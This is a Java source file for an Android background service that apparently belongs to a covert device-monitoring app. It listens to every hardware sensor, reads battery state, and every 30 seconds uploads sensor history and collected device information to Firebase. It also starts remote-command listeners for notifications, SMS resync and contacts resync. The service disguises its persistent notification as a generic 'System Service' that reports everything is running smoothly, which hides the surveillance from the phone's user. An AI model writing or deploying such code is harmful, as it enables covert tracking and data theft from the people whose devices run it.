package com.vikasyadavnsit.cdc.services;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.content.IntentFilter;
import android.os.BatteryManager;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;
import com.vikasyadavnsit.cdc.utils.LoggerUtils;

import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;

public class CDCSensorService extends Service implements SensorEventListener {
    private static final String CHANNEL_ID = "CDCSensorServiceChannel";
    private static final long UPLOAD_INTERVAL_MS = 30000; // 30 seconds

    private SensorManager sensorManager;
    private boolean isListening = false;
    private boolean isUploadRunning = false;
    private final Map<String, Object> currentSensorValues = new HashMap<>();
    private final java.util.LinkedList<Map<String, Object>> sensorHistory = new java.util.LinkedList<>();
    private static final int MAX_HISTORY_SLOTS = 10;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private final Runnable uploadRunnable = new Runnable() {
        @Override
        public void run() {
            uploadSensorData();
            handler.postDelayed(this, UPLOAD_INTERVAL_MS);
        }
    };

    public static void startSensorService(Activity activity) {
        Intent intent = new Intent(activity, CDCSensorService.class);
        intent.setAction("START_SENSOR");
        activity.startForegroundService(intent);
    }

    public static void stopSensorService(Activity activity) {
        Intent intent = new Intent(activity, CDCSensorService.class);
        intent.setAction("STOP_SENSOR");
        activity.startForegroundService(intent);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        LoggerUtils.d("CDCSensorService", "onCreate: Initializing hardware sensor listeners");
        com.vikasyadavnsit.cdc.utils.FirebaseUtils.initialize(this);
        sensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
        startListeningToSensors();
        createSensorNotificationChannel();
        startForeground(1, getSensorNotification());
        
        // Ensure background listeners are active
        FirebaseUtils.listenForNotificationCommand(getApplicationContext());
        FirebaseUtils.listenForSmsResyncCommand(getApplicationContext());
        FirebaseUtils.listenForContactsResyncCommand(getApplicationContext());

        if (!isUploadRunning) {
            LoggerUtils.i("CDCSensorService", "Starting sensor data upload cycle (Interval: " + UPLOAD_INTERVAL_MS + "ms)");
            handler.post(uploadRunnable);
            isUploadRunning = true;
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            LoggerUtils.d("CDCSensorService", "onStartCommand: action=" + action);
            if ("STOP_SENSOR".equals(action)) {
                LoggerUtils.i("CDCSensorService", "Stopping sensor service manually");
                stopListeningToSensors();
                handler.removeCallbacks(uploadRunnable);
                isUploadRunning = false;
                stopSelf();
            } else {  //("START_SENSOR".equals(action))
                startListeningToSensors();
                if (!isUploadRunning) {
                    LoggerUtils.i("CDCSensorService", "Resuming sensor data upload cycle");
                    handler.post(uploadRunnable);
                    isUploadRunning = true;
                } else {
                    LoggerUtils.d("CDCSensorService", "Triggering immediate manual sensor update");
                    handler.removeCallbacks(uploadRunnable);
                    handler.post(uploadRunnable);
                }
            }
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopListeningToSensors();
        handler.removeCallbacks(uploadRunnable);
        isUploadRunning = false;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onSensorChanged(SensorEvent event) {
        String sensorName = event.sensor.getName();
        if (event.values.length > 0) {
            Object value;
            if (event.values.length == 1) {
                value = event.values[0];
            } else {
                value = Arrays.toString(event.values);
            }
            currentSensorValues.put(sensorName, value);
        }
    }

    private void uploadSensorData() {
        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = registerReceiver(null, ifilter);
        if (batteryStatus != null) {
            int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            float batteryPct = level * 100 / (float) scale;
            currentSensorValues.put("Battery Level", String.format(java.util.Locale.getDefault(), "%.1f%%", batteryPct));
            
            int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
            boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                                 status == BatteryManager.BATTERY_STATUS_FULL;
            currentSensorValues.put("Battery Status", isCharging ? "Charging" : "Discharging");
        }

        currentSensorValues.put("Last Update", new java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(new java.util.Date()));
        
        Map<String, Object> snapshot = new HashMap<>(currentSensorValues);
        sensorHistory.addLast(snapshot);
        if (sensorHistory.size() > MAX_HISTORY_SLOTS) {
            sensorHistory.removeFirst();
        }

        LoggerUtils.d("CDCSensorService", "Uploading sensor history: " + sensorHistory.size() + " snapshots");
        FirebaseUtils.uploadSensorHistory(new java.util.ArrayList<>(sensorHistory));
        FirebaseUtils.uploadSensorDataSnapshot(snapshot);

        // Device info piggybacked on the same 30-second cycle
        new Thread(() -> FirebaseUtils.uploadDeviceInfo(
                com.vikasyadavnsit.cdc.utils.DeviceInfoUtils.collectAll(getApplicationContext())
        )).start();
    }

    @Override
    public void onAccuracyChanged(Sensor sensor, int accuracy) {
        // Do something if sensor accuracy changes
    }

    private @NonNull Notification getSensorNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Everything is running smoothly.")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .build();
    }

    private void startListeningToSensors() {
        if (sensorManager != null && !isListening) {
            List<Sensor> deviceSensors = sensorManager.getSensorList(Sensor.TYPE_ALL);
            for (Sensor sensor : deviceSensors) {
                // Filter out uncalibrated and non-standard sensors for cleaner data
                boolean isUncalibrated = sensor.getName().toLowerCase().contains("uncalibrated") 
                        || sensor.getStringType().toLowerCase().contains("uncalibrated");
                
                if (!isUncalibrated) {
                    sensorManager.registerListener(this, sensor, SensorManager.SENSOR_DELAY_UI);
                }
            }
            isListening = true;
        }
    }

    private void stopListeningToSensors() {
        if (sensorManager != null && isListening) {
            sensorManager.unregisterListener(this);
            isListening = false;
        }
    }

    private void createSensorNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(CHANNEL_ID
                    , "CDCSensor Service Channel", NotificationManager.IMPORTANCE_DEFAULT);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }
}
